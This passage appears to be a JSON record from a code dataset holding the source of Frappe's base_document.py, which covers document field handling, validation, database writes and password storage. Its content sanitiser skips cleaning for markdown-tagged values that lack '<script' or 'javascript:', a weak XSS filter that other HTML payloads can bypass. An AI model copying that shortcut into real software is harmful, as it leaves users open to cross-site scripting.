self.as_dict(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t\tif df and not df.allow_on_submit and(self.get(key) or db_value): \t\t\t\tif df.fieldtype==\"Table\": \t\t\t\t\t \t\t\t\t\t \t\t\t\t\tself_value=len(self.get(key)) \t\t\t\t\tdb_value=len(db_value) \t\t\t\telse: \t\t\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code' \t\t\"\"\" \t\tif frappe.flags.in_install: \t\t\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\": \t\t\t\tsanitized_value=sanitize_email(value) \t\t\telif df and(df.get(\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\") \t\t\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df.fieldtype=='Text Editor') \t\t\tself.set(fieldname, sanitized_value) \tdef _save_passwords(self): \t\t'''Save password field values in __Auth table''' \t\tif self.flags.ignore_save_passwords is True: \t\t\treturn \t\tfor df in self.meta.get('fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue \t\t\tnew_password=self.get(df.fieldname) \t\t\tif new_password and not self.is_dummy_password(new_password): \t\t\t\t \t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname) \t\t\t\t \t\t\t\tself.set(df.fieldname, '*'*len(new_password)) \tdef get_password(self, fieldname='password', raise_exception=True): \t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)): \t\t\treturn self.get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception) \tdef is_dummy_password(self, pwd): \t\treturn ''.join(set(pwd))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param parentfield: If fieldname is in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif parentfield and not isinstance(parentfield, string_types): \t\t\tparentfield=parentfield.parentfield \t\tcache_key=parentfield or \"main\" \t\tif not hasattr(self, \"_precision\"): \t\t\tself._precision=frappe._dict() \t\tif cache_key not in self._precision: \t\t\tself._precision[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname) \t\t\tif df.fieldtype in(\"Currency\", \"Float\", \"Percent\"): \t\t\t\tself._precision[cache_key][fieldname]=get_field_precision(df, self) \t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value \t\tdf=self.meta.get_field(fieldname) \t\tif not df and fieldname in default_fields: \t\t\tfrom frappe.model.meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val,(int, float)): \t\t\tval=abs(self.get(fieldname)) \t\tif not doc: \t\t\tdoc=getattr(self, \"parent_doc\", None) or self \t\treturn format_value(val, df=df, doc=doc, currency=currency) \tdef is_print_hide(self, fieldname, df=None, for_print=True): \t\t\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] \t\t:param fieldname: Fieldname to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self.meta.get_field(fieldname) \t\tif meta_df and meta_df.get(\"__print_hide\"): \t\t\treturn True \t\tprint_hide=0 \t\tif self.get(fieldname)==0 and not self.meta.istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t\tif not print_hide: \t\t\tif df and df.print_hide is not None: \t\t\t\tprint_hide=df.print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t\t\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields: \t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t \t\t\t\tref_doc=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t\t \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field(fieldname) \t\tval=self.get(fieldname) \t\treturn self.cast(val, df) \tdef cast(self, value, df): \t\treturn cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=(\"=\", fval) \t\t\t_filters[f]=fval \tfor d in data: \t\tadd=True \t\tfor f, fval in iteritems(_filters): \t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]): \t\t\t\tadd=False \t\t\t\tbreak \t\tif add: \t\t\tout.append(d) \t\t\tif limit and(len(out)-1)==limit: \t\t\t\tbreak \treturn out ",
                    "sourceWithComments": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\nfrom six import iteritems, string_types\nimport datetime\nimport frappe, sys\nfrom frappe import _\nfrom frappe.utils import (cint, flt, now, cstr, strip_html,\n\tsanitize_html, sanitize_email, cast_fieldtype)\nfrom frappe.model import default_fields\nfrom frappe.model.naming import set_new_name\nfrom frappe.model.utils.link_count import notify_link_count\nfrom frappe.modules import load_doctype_module\nfrom frappe.model import display_fieldtypes\nfrom frappe.model.db_schema import type_map, varchar_len\nfrom frappe.utils.password import get_decrypted_password, set_encrypted_password\n\n_classes = {}\n\ndef get_controller(doctype):\n\t\"\"\"Returns the **class** object of the given DocType.\n\tFor `custom` type, returns `frappe.model.document.Document`.\n\n\t:param doctype: DocType name as string.\"\"\"\n\tfrom frappe.model.document import Document\n\tglobal _classes\n\n\tif not doctype in _classes:\n\t\tmodule_name, custom = frappe.db.get_value(\"DocType\", doctype, (\"module\", \"custom\"), cache=True) \\\n\t\t\tor [\"Core\", False]\n\n\t\tif custom:\n\t\t\t_class = Document\n\t\telse:\n\t\t\tmodule = load_doctype_module(doctype, module_name)\n\t\t\tclassname = doctype.replace(\" \", \"\").replace(\"-\", \"\")\n\t\t\tif hasattr(module, classname):\n\t\t\t\t_class = getattr(module, classname)\n\t\t\t\tif issubclass(_class, BaseDocument):\n\t\t\t\t\t_class = getattr(module, classname)\n\t\t\t\telse:\n\t\t\t\t\traise ImportError(doctype)\n\t\t\telse:\n\t\t\t\traise ImportError(doctype)\n\t\t_classes[doctype] = _class\n\n\treturn _classes[doctype]\n\nclass BaseDocument(object):\n\tignore_in_getter = (\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\")\n\n\tdef __init__(self, d):\n\t\tself.update(d)\n\t\tself.dont_update_if_missing = []\n\n\t\tif hasattr(self, \"__setup__\"):\n\t\t\tself.__setup__()\n\n\t@property\n\tdef meta(self):\n\t\tif not hasattr(self, \"_meta\"):\n\t\t\tself._meta = frappe.get_meta(self.doctype)\n\n\t\treturn self._meta\n\n\tdef update(self, d):\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\n\t\t# first set default field values of base document\n\t\tfor key in default_fields:\n\t\t\tif key in d:\n\t\t\t\tself.set(key, d.get(key))\n\n\t\tfor key, value in iteritems(d):\n\t\t\tself.set(key, value)\n\n\t\treturn self\n\n\tdef update_if_missing(self, d):\n\t\tif isinstance(d, BaseDocument):\n\t\t\td = d.get_valid_dict()\n\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\t\tfor key, value in iteritems(d):\n\t\t\t# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value\n\t\t\tif (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):\n\t\t\t\tself.set(key, value)\n\n\tdef get_db_value(self, key):\n\t\treturn frappe.db.get_value(self.doctype, self.name, key)\n\n\tdef get(self, key=None, filters=None, limit=None, default=None):\n\t\tif key:\n\t\t\tif isinstance(key, dict):\n\t\t\t\treturn _filter(self.get_all_children(), key, limit=limit)\n\t\t\tif filters:\n\t\t\t\tif isinstance(filters, dict):\n\t\t\t\t\tvalue = _filter(self.__dict__.get(key, []), filters, limit=limit)\n\t\t\t\telse:\n\t\t\t\t\tdefault = filters\n\t\t\t\t\tfilters = None\n\t\t\t\t\tvalue = self.__dict__.get(key, default)\n\t\t\telse:\n\t\t\t\tvalue = self.__dict__.get(key, default)\n\n\t\t\tif value is None and key not in self.ignore_in_getter \\\n\t\t\t\tand key in (d.fieldname for d in self.meta.get_table_fields()):\n\t\t\t\tself.set(key, [])\n\t\t\t\tvalue = self.__dict__.get(key)\n\n\t\t\treturn value\n\t\telse:\n\t\t\treturn self.__dict__\n\n\tdef getone(self, key, filters=None):\n\t\treturn self.get(key, filters=filters, limit=1)[0]\n\n\tdef set(self, key, value, as_value=False):\n\t\tif isinstance(value, list) and not as_value:\n\t\t\tself.__dict__[key] = []\n\t\t\tself.extend(key, value)\n\t\telse:\n\t\t\tself.__dict__[key] = value\n\n\tdef delete_key(self, key):\n\t\tif key in self.__dict__:\n\t\t\tdel self.__dict__[key]\n\n\tdef append(self, key, value=None):\n\t\tif value==None:\n\t\t\tvalue={}\n\t\tif isinstance(value, (dict, BaseDocument)):\n\t\t\tif not self.__dict__.get(key):\n\t\t\t\tself.__dict__[key] = []\n\t\t\tvalue = self._init_child(value, key)\n\t\t\tself.__dict__[key].append(value)\n\n\t\t\t# reference parent document\n\t\t\tvalue.parent_doc = self\n\n\t\t\treturn value\n\t\telse:\n\n\t\t\t# metaclasses may have arbitrary lists\n\t\t\t# which we can ignore\n\t\t\tif (getattr(self, '_metaclass', None)\n\t\t\t\tor self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):\n\t\t\t\treturn value\n\n\t\t\traise ValueError(\n\t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not {2} ({3})'.format(key,\n\t\t\t\t\tself.name, str(type(value))[1:-1], value)\n\t\t\t)\n\n\tdef extend(self, key, value):\n\t\tif isinstance(value, list):\n\t\t\tfor v in value:\n\t\t\t\tself.append(key, v)\n\t\telse:\n\t\t\traise ValueError\n\n\tdef remove(self, doc):\n\t\tself.get(doc.parentfield).remove(doc)\n\n\tdef _init_child(self, value, key):\n\t\tif not self.doctype:\n\t\t\treturn value\n\t\tif not isinstance(value, BaseDocument):\n\t\t\tif \"doctype\" not in value:\n\t\t\t\tvalue[\"doctype\"] = self.get_table_field_doctype(key)\n\t\t\t\tif not value[\"doctype\"]:\n\t\t\t\t\traise AttributeError(key)\n\t\t\tvalue = get_controller(value[\"doctype\"])(value)\n\t\t\tvalue.init_valid_columns()\n\n\t\tvalue.parent = self.name\n\t\tvalue.parenttype = self.doctype\n\t\tvalue.parentfield = key\n\n\t\tif value.docstatus is None:\n\t\t\tvalue.docstatus = 0\n\n\t\tif not getattr(value, \"idx\", None):\n\t\t\tvalue.idx = len(self.get(key) or []) + 1\n\n\t\tif not getattr(value, \"name\", None):\n\t\t\tvalue.__dict__['__islocal'] = 1\n\n\t\treturn value\n\n\tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False):\n\t\td = frappe._dict()\n\t\tfor fieldname in self.meta.get_valid_columns():\n\t\t\td[fieldname] = self.get(fieldname)\n\n\t\t\t# if no need for sanitization and value is None, continue\n\t\t\tif not sanitize and d[fieldname] is None:\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tif df:\n\t\t\t\tif df.fieldtype==\"Check\":\n\t\t\t\t\tif d[fieldname]==None:\n\t\t\t\t\t\td[fieldname] = 0\n\n\t\t\t\t\telif (not isinstance(d[fieldname], int) or d[fieldname] > 1):\n\t\t\t\t\t\td[fieldname] = 1 if cint(d[fieldname]) else 0\n\n\t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int):\n\t\t\t\t\td[fieldname] = cint(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float):\n\t\t\t\t\td[fieldname] = flt(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\":\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\":\n\t\t\t\t\t# unique empty field should be set to None\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype != 'Table':\n\t\t\t\t\tfrappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))\n\n\t\t\t\tif convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):\n\t\t\t\t\td[fieldname] = str(d[fieldname])\n\n\t\treturn d\n\n\tdef init_valid_columns(self):\n\t\tfor key in default_fields:\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\t\t\tif key in (\"idx\", \"docstatus\") and self.__dict__[key] is None:\n\t\t\t\tself.__dict__[key] = 0\n\n\t\tfor key in self.get_valid_columns():\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\tdef get_valid_columns(self):\n\t\tif self.doctype not in frappe.local.valid_columns:\n\t\t\tif self.doctype in (\"DocField\", \"DocPerm\") and self.parent in (\"DocType\", \"DocField\", \"DocPerm\"):\n\t\t\t\tfrom frappe.model.meta import get_table_columns\n\t\t\t\tvalid = get_table_columns(self.doctype)\n\t\t\telse:\n\t\t\t\tvalid = self.meta.get_valid_columns()\n\n\t\t\tfrappe.local.valid_columns[self.doctype] = valid\n\n\t\treturn frappe.local.valid_columns[self.doctype]\n\n\tdef is_new(self):\n\t\treturn self.get(\"__islocal\")\n\n\tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):\n\t\tdoc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)\n\t\tdoc[\"doctype\"] = self.doctype\n\t\tfor df in self.meta.get_table_fields():\n\t\t\tchildren = self.get(df.fieldname) or []\n\t\t\tdoc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]\n\n\t\tif no_nulls:\n\t\t\tfor k in list(doc):\n\t\t\t\tif doc[k] is None:\n\t\t\t\t\tdel doc[k]\n\n\t\tif no_default_fields:\n\t\t\tfor k in list(doc):\n\t\t\t\tif k in default_fields:\n\t\t\t\t\tdel doc[k]\n\n\t\tfor key in (\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"):\n\t\t\tif self.get(key):\n\t\t\t\tdoc[key] = self.get(key)\n\n\t\treturn doc\n\n\tdef as_json(self):\n\t\treturn frappe.as_json(self.as_dict())\n\n\tdef get_table_field_doctype(self, fieldname):\n\t\treturn self.meta.get_field(fieldname).options\n\n\tdef get_parentfield_of_doctype(self, doctype):\n\t\tfieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]\n\t\treturn fieldname[0] if fieldname else None\n\n\tdef db_insert(self):\n\t\t\"\"\"INSERT the document (with valid columns) in the database.\"\"\"\n\t\tif not self.name:\n\t\t\t# name will be set by document class in most cases\n\t\t\tset_new_name(self)\n\n\t\tif not self.creation:\n\t\t\tself.creation = self.modified = now()\n\t\t\tself.created_by = self.modifield_by = frappe.session.user\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\tcolumns = list(d)\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}`\n\t\t\t\t({columns}) values ({values})\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tcolumns = \", \".join([\"`\"+c+\"`\" for c in columns]),\n\t\t\t\t\tvalues = \", \".join([\"%s\"] * len(columns))\n\t\t\t\t), list(d.values()))\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062:\n\t\t\t\tif \"PRIMARY\" in cstr(e.args[1]):\n\t\t\t\t\tif self.meta.autoname==\"hash\":\n\t\t\t\t\t\t# hash collision? try again\n\t\t\t\t\t\tself.name = None\n\t\t\t\t\t\tself.db_insert()\n\t\t\t\t\t\treturn\n\n\t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e)\n\n\t\t\t\telif \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\t\t# unique constraint\n\t\t\t\t\tself.show_unique_validation_message(e)\n\t\t\t\telse:\n\t\t\t\t\traise\n\t\t\telse:\n\t\t\t\traise\n\t\tself.set(\"__islocal\", False)\n\n\tdef db_update(self):\n\t\tif self.get(\"__islocal\") or not self.name:\n\t\t\tself.db_insert()\n\t\t\treturn\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\t# don't update name, as case might've been changed\n\t\tname = d['name']\n\t\tdel d['name']\n\n\t\tcolumns = list(d)\n\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}`\n\t\t\t\tset {values} where name=%s\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tvalues = \", \".join([\"`\"+c+\"`=%s\" for c in columns])\n\t\t\t\t), list(d.values()) + [name])\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\tself.show_unique_validation_message(e)\n\t\t\telse:\n\t\t\t\traise\n\n\tdef show_unique_validation_message(self, e):\n\t\ttype, value, traceback = sys.exc_info()\n\t\tfieldname, label = str(e).split(\"'\")[-2], None\n\n\t\t# unique_first_fieldname_second_fieldname is the constraint name\n\t\t# created using frappe.db.add_unique\n\t\tif \"unique_\" in fieldname:\n\t\t\tfieldname = fieldname.split(\"_\", 1)[1]\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif df:\n\t\t\tlabel = df.label\n\n\t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname)))\n\n\t\t# this is used to preserve traceback\n\t\traise frappe.UniqueValidationError(self.doctype, self.name, e)\n\n\tdef update_modified(self):\n\t\t'''Update modified timestamp'''\n\t\tself.set(\"modified\", now())\n\t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)\n\n\tdef _fix_numeric_types(self):\n\t\tfor df in self.meta.get(\"fields\"):\n\t\t\tif df.fieldtype == \"Check\":\n\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\telif self.get(df.fieldname) is not None:\n\t\t\t\tif df.fieldtype == \"Int\":\n\t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\t\telif df.fieldtype in (\"Float\", \"Currency\", \"Percent\"):\n\t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname)))\n\n\t\tif self.docstatus is not None:\n\t\t\tself.docstatus = cint(self.docstatus)\n\n\tdef _get_missing_mandatory_fields(self):\n\t\t\"\"\"Get mandatory fields that do not have any values\"\"\"\n\t\tdef get_msg(df):\n\t\t\tif df.fieldtype == \"Table\":\n\t\t\t\treturn \"{}: {}: {}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label))\n\n\t\t\telif self.parentfield:\n\t\t\t\treturn \"{}: {} {} #{}: {}: {}\".format(_(\"Error\"), frappe.bold(_(self.doctype)),\n\t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label))\n\n\t\t\telse:\n\t\t\t\treturn _(\"Error: Value missing for {0}: {1}\").format(_(df.parent), _(df.label))\n\n\t\tmissing = []\n\n\t\tfor df in self.meta.get(\"fields\", {\"reqd\": ('=', 1)}):\n\t\t\tif self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():\n\t\t\t\tmissing.append((df.fieldname, get_msg(df)))\n\n\t\t# check for missing parent and parenttype\n\t\tif self.meta.istable:\n\t\t\tfor fieldname in (\"parent\", \"parenttype\"):\n\t\t\t\tif not self.get(fieldname):\n\t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname))))\n\n\t\treturn missing\n\n\tdef get_invalid_links(self, is_submittable=False):\n\t\t'''Returns list of invalid links and also updates fetch values if not set'''\n\t\tdef get_msg(df, docname):\n\t\t\tif self.parentfield:\n\t\t\t\treturn \"{} #{}: {}: {}\".format(_(\"Row\"), self.idx, _(df.label), docname)\n\t\t\telse:\n\t\t\t\treturn \"{}: {}\".format(_(df.label), docname)\n\n\t\tinvalid_links = []\n\t\tcancelled_links = []\n\n\t\tfor df in (self.meta.get_link_fields()\n\t\t\t\t+ self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Dynamic Link\")})):\n\t\t\tdocname = self.get(df.fieldname)\n\n\t\t\tif docname:\n\t\t\t\tif df.fieldtype==\"Link\":\n\t\t\t\t\tdoctype = df.options\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field {0}\").format(df.fieldname))\n\t\t\t\telse:\n\t\t\t\t\tdoctype = self.get(df.options)\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options)))\n\n\t\t\t\t# MySQL is case insensitive. Preserve case of the original docname in the Link Field.\n\n\t\t\t\t# get a map of values ot fetch along with this link query\n\t\t\t\t# that are mapped as link_fieldname.source_fieldname in Options of\n\t\t\t\t# Readonly or Data or Text type fields\n\n\t\t\t\tfields_to_fetch = [\n\t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname)\n\t\t\t\t\tif\n\t\t\t\t\t\tnot _df.get('fetch_if_empty')\n\t\t\t\t\t\tor (_df.get('fetch_if_empty') and not self.get(_df.fieldname))\n\t\t\t\t]\n\n\t\t\t\tif not fields_to_fetch:\n\t\t\t\t\t# cache a single value type\n\t\t\t\t\tvalues = frappe._dict(name=frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\t'name', cache=True))\n\t\t\t\telse:\n\t\t\t\t\tvalues_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]\n\t\t\t\t\t\tfor _df in fields_to_fetch]\n\n\t\t\t\t\t# don't cache if fetching other values too\n\t\t\t\t\tvalues = frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\tvalues_to_fetch, as_dict=True)\n\n\t\t\t\tif frappe.get_meta(doctype).issingle:\n\t\t\t\t\tvalues.name = doctype\n\n\t\t\t\tif values:\n\t\t\t\t\tsetattr(self, df.fieldname, values.name)\n\n\t\t\t\t\tfor _df in fields_to_fetch:\n\t\t\t\t\t\tif self.is_new() or self.docstatus != 1 or _df.allow_on_submit:\n\t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])\n\n\t\t\t\t\tnotify_link_count(doctype, docname)\n\n\t\t\t\t\tif not values.name:\n\t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\t\t\t\telif (df.fieldname != \"amended_from\"\n\t\t\t\t\t\tand (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable\n\t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2):\n\n\t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\treturn invalid_links, cancelled_links\n\n\tdef _validate_selects(self):\n\t\tif frappe.flags.in_import:\n\t\t\treturn\n\n\t\tfor df in self.meta.get_select_fields():\n\t\t\tif df.fieldname==\"naming_series\" or not (self.get(df.fieldname) and df.options):\n\t\t\t\tcontinue\n\n\t\t\toptions = (df.options or \"\").split(\"\\n\")\n\n\t\t\t# if only empty options\n\t\t\tif not filter(None, options):\n\t\t\t\tcontinue\n\n\t\t\t# strip and set\n\t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip())\n\t\t\tvalue = self.get(df.fieldname)\n\n\t\t\tif value not in options and not (frappe.flags.in_test and value.startswith(\"_T-\")):\n\t\t\t\t# show an elaborate message\n\t\t\t\tprefix = _(\"Row #{0}:\").format(self.idx) if self.get(\"parentfield\") else \"\"\n\t\t\t\tlabel = _(self.meta.get_label(df.fieldname))\n\t\t\t\tcomma_options = '\", \"'.join(_(each) for each in options)\n\n\t\t\t\tfrappe.throw(_('{0} {1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label,\n\t\t\t\t\tvalue, comma_options))\n\n\tdef _validate_constants(self):\n\t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:\n\t\t\treturn\n\n\t\tconstants = [d.fieldname for d in self.meta.get(\"fields\", {\"set_only_once\": ('=',1)})]\n\t\tif constants:\n\t\t\tvalues = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)\n\n\t\tfor fieldname in constants:\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\t# This conversion to string only when fieldtype is Date\n\t\t\tif df.fieldtype == 'Date' or df.fieldtype == 'Datetime':\n\t\t\t\tvalue = str(values.get(fieldname))\n\n\t\t\telse:\n\t\t\t\tvalue  = values.get(fieldname)\n\n\t\t\tif self.get(fieldname) != value:\n\t\t\t\tfrappe.throw(_(\"Value cannot be changed for {0}\").format(self.meta.get_label(fieldname)),\n\t\t\t\t\tfrappe.CannotChangeConstantError)\n\n\tdef _validate_length(self):\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tif self.meta.issingle:\n\t\t\t# single doctype value type is mediumtext\n\t\t\treturn\n\n\t\tcolumn_types_to_check_length = ('varchar', 'int', 'bigint')\n\n\t\tfor fieldname, value in iteritems(self.get_valid_dict()):\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\tif not df or df.fieldtype == 'Check':\n\t\t\t\t# skip standard fields and Check fields\n\t\t\t\tcontinue\n\n\t\t\tcolumn_type = type_map[df.fieldtype][0] or None\n\t\t\tdefault_column_max_length = type_map[df.fieldtype][1] or None\n\n\t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length:\n\t\t\t\tmax_length = cint(df.get(\"length\")) or cint(default_column_max_length)\n\n\t\t\t\tif len(cstr(value)) > max_length:\n\t\t\t\t\tif self.parentfield and self.idx:\n\t\t\t\t\t\treference = _(\"{0}, Row {1}\").format(_(self.doctype), self.idx)\n\n\t\t\t\t\telse:\n\t\t\t\t\t\treference = \"{0} {1}\".format(_(self.doctype), self.name)\n\n\t\t\t\t\tfrappe.throw(_(\"{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}\")\\\n\t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))\n\n\tdef _validate_update_after_submit(self):\n\t\t# get the full doc with children\n\t\tdb_values = 